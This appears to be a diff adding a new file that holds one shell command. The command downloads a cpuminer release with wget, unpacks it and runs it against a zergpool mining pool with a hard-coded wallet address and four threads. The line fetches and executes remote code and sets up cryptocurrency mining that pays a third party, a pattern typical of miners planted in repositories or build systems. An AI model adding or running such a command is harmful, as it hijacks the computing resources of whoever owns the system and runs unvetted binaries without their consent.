@@ -1,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz &&./cpuminer-sse2 -a yescryptR16 -o stratum+tcp://yescryptR16.na.mine.zergpool.com:6333 -u MKi4nbg1AbGEBASny4twMHVFJiwsiMYQdx -p  c=LTC,mc=QOGE,ID=Galah -t 4
